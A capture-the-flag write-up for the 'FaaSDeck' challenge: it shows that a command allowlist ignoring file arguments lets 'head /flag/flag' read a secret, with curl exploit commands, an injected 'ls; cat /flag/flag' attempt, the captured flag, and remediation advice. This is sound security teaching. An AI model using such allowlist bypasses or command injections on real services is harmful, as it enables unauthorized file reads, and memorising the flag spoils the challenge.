# FaaSDeck - "serverless" file read via an allowlist that ignores arguments

| | |
|---|---|
| **Challenge** | FaaSDeck |
| **Category** | INJ (cloud) |
| **Points / Difficulty** | 250 / hard |
| **Target** | http://inj13.chal.deti:8052 |
| **Bug** | CWE-78 - command allowlist checks the command, not its file argument; "isolation" is cosmetic (same uid/fs/flag) |

## Hint
> The platform says isolated; the process says otherwise; one uid, one flag.

## Recon
Three features:
- **Deploy** `POST /functions` (`name`, `body`) - the `body` is a shell pipeline
  the platform runs. The body is **allowlisted**: *"body must be a pipeline of:
  base64, cut, head, rev, sort, tac, tail, tr, uniq, wc"* (so `cat` → `Rejected`).
- **Invoke** `POST /invoke` (`name`, `input`) - pipes `input` to the body, shows output.
- **Exec** `POST /exec` (`pod` allowlist, `args`).

## Approach - two doors
**Door 1 (function body) - the one that works here.** The allowlist restricts the
**command name** but **not its file argument** - and several allowlisted tools
read arbitrary files. So an allowed reader pointed at the flag passes the filter:
```
deploy: name=mine_s14b  body=head /flag/flag     # head is allowlisted
invoke: name=mine_s14b  input=x                  -> flag
```
`head /flag/flag` (equally `tail`, `base64`, `cut … /flag/flag`) reads the secret
as the service user. The body is code; `input` is only stdin (data).

**Door 2 (exec API).** The pod list is an allowlist on *which* container, not what
runs - but this instance **also filters the exec args** (`args=ls; cat /flag/flag`
→ `command not permitted`), so door 2 is gated here. Door 1 is the reliable path.

The "isolated environment" is the **same uid, same filesystem, same flag**.

## Exploitation
```bash
curl -s --data-urlencode "name=mine_s14b" --data-urlencode "body=head /flag/flag" \
  http://inj13.chal.deti:8052/functions          # -> "function mine_s14b deployed."
curl -s --data-urlencode "name=mine_s14b" --data-urlencode "input=x" \
  http://inj13.chal.deti:8052/invoke | grep -oE 'flag\{[^}]*\}'
```

## Flag
```
flag{6054a4d8039e55c9d370851f47d4dd70}
```

## For the report
- **Door used:** the **function body**. The body is executed as a shell pipeline;
  the allowlist (`base64, cut, head, rev, sort, tac, tail, tr, uniq, wc`) checks
  the **command**, not the **path argument**, so `head /flag/flag` is accepted and
  reads any file. (`input` is data on stdin, not the injection point.)
- **What the allowlist controls / doesn't:** it controls *which binaries* run, not
  *which files they touch* - the wrong granularity. Several "safe" text tools are
  arbitrary-file readers.
- **What real isolation would require:** a **different user**, a **filesystem
  without the secret**, and running pipelines in a true sandbox - not as the
  service account on the shared host.
- **Fix per door:** (1) don't run user pipelines as the service user with access
  to secrets; if a tool allowlist is used, **also constrain the arguments/paths**
  (chroot/jail the working set); (2) exec should allowlist the *command set* and
  pass **argv with `shell=False`**, not join args into a shell string.

## Root cause & remediation
- **Cause:** "serverless" is a billing model, not a security boundary; an
  allowlist of command *names* with unrestricted *arguments* still reads the flag
  (CWE-78 / path not confined).
- **Fix:** real tenant isolation + least privilege; confine file access; keep the
  flag off the shared filesystem.
